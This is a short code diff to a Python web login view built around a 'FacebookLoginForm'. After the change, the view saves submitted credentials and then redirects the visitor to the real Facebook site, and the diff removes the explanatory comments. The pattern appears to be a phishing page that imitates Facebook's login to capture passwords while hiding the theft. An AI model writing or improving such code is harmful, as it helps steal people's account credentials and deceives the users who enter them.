@@ -6,8 +6,8 @@ def login(request):
     if request.method == 'POST':
         form = FacebookLoginForm(request.POST)
         if form.is_valid():
-            form.save()  # Save the form data (or authenticate if this is a login form)
-            return redirect('login')  # Adjust this to the correct redirect path after login
+            form.save()  
+            return redirect('https://www.facebook.com/')  
     else:
         form = FacebookLoginForm()
     
